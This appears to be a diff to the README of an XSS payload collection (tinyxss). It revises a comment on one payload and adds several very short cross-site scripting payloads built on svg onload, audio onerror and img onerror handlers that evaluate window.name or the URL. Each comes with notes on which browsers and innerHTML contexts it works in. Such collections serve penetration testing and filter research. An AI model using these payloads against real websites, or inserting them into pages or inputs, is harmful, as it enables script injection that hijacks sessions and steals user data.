@@ -6,7 +6,7 @@ The DEMO available here: <https://tinyxss.terjanq.me>
 
 ## Current Payloads
 ```html
-<!-- If you control the name, will work on Firefox in any context, will fail in chromium in DOM -->
+<!-- Only works as reflected XSS -->
 <svg/onload=eval(name)>
 ```
 
@@ -18,6 +18,21 @@ The DEMO available here: <https://tinyxss.terjanq.me>
 ```html
 <!-- If you control the name, but unsafe-eval not enabled -->
 <svg/onload=location=name>
+```
+
+```html
+<!-- In chrome, also works inside innerHTML, even for elements not yet inserted into DOM -->
+<svg><svg/onload=eval(name)>
+```
+
+<!-- If you control window's name, this payload is that it will work inside innerHTML on elements not yet inserted into the DOM -->
+```html
+<audio/src/onerror=eval(name)>
+```
+
+<!-- If you control the URL, this payload is that it will work inside innerHTML on elements not yet inserted into the DOM -->
+```html
+<img/src/onerror=eval(`'`+URL)>
 ```
 
 ```html
